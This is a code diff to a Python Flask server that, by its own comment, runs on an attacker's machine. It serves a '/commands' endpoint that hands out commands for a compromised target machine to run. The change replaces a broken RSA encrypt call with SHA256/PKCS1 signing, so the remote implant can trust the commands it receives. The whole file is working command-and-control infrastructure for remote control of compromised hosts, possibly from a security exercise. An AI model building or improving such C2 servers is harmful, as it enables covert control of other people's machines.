@@ -1,13 +1,38 @@
 # flask server to host on attackers machine
 # Provides an endpoint which will return a list of commands to run on the target machine
 
-import flask, rsa
+import flask
 from Crypto.PublicKey import RSA
+from Crypto.Hash import SHA256
+from Crypto.Signature import pkcs1_15
+from base64 import b64encode
 
 app = flask.Flask(__name__)
 
 file_path = "commands.txt"
-private_key_name = "rsa.private"
+private_key_name = "private.pem"
+public_key_name = "public.pem"
+
+def sign_message(message):
+    # Signing function from 
+    # https://blog.epalm.ca/signing-and-verifying-with-rsa-keys/
+
+    # sign commands with private key
+    private_key = RSA.importKey(open(private_key_name, 'r').read())
+
+    digest = SHA256.new(message.encode())
+    print("Digest is", digest)
+
+    signature = pkcs1_15.new(private_key).sign(digest)
+
+    public_key = RSA.importKey(open(public_key_name, 'r').read())
+
+    pkcs1_15.new(public_key).verify(digest, signature)
+
+    signature_b64 = b64encode(signature)
+
+    return signature_b64
+
 
 @app.route('/commands', methods=['GET'])
 def commands():
@@ -19,8 +44,8 @@ def commands():
     with open(file_path, 'w') as f:
         f.write('')
 
-    # sign commands with private key
-    private_key = RSA.importKey(open(private_key_name, 'rb').read())
-    signed_commands = private_key.encrypt(commands.encode(), 32)[0]
+    print("Commands are", commands)
 
-    return signed_commands
+    signed_message = sign_message(commands)
+
+    return flask.jsonify(signature=signed_message.decode("utf-8"), message=commands)
